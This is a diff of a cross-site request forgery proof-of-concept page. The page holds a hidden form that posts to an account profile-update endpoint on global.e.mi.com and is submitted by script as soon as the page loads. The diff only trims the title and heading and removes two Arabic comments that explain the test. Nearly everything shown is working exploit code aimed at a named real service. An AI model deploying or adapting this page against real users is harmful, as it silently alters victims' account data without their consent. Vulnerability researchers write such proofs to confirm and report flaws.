@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF PoC - Account Profile Update</title>
+    <title>CSRF PoC - Account</title>
 </head>
 <body>
-    <h3>CSRF Exploit - Update Profile</h3>
-    <p>إذا ظهرت رسالة "تم التحديث" أو تغيرت بياناتك، فالثغرة موجودة.</p>
+    <h3>CSRF Exploit</h3>
     
     <form id="csrfForm" action="https://global.e.mi.com/api/v1/account/profile/update?lang=en-US" method="POST">
     <input type="hidden" name="accountType" value="1">
@@ -34,7 +33,6 @@
 </form>
     
     <script>
-        // إرسال الطلب تلقائيًا عند تحميل الصفحة
         window.onload = function() {
             document.getElementById("csrfForm").submit();
         };
